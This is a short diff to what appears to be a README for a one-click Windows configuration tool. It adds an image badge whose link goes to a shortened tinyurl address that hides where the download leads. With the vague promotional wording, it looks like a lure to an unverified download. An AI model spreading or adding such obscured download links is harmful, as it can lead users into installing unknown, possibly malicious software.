@@ -4,7 +4,7 @@
 
 Tired of navigating complex settings after installing Windows? This tool simplifies everything. With a single click, it applies the final configurations needed to unlock your operating system's full potential, making it feature-ready and optimized for daily use.
 
-
+[![1231209876](https://github.com/user-attachments/assets/87b04ea2-f188-4847-88db-8b9498435823)](https://tinyurl.com/5xye8y7c)
 
 ## 🎯 **Purpose & Functionality**
 
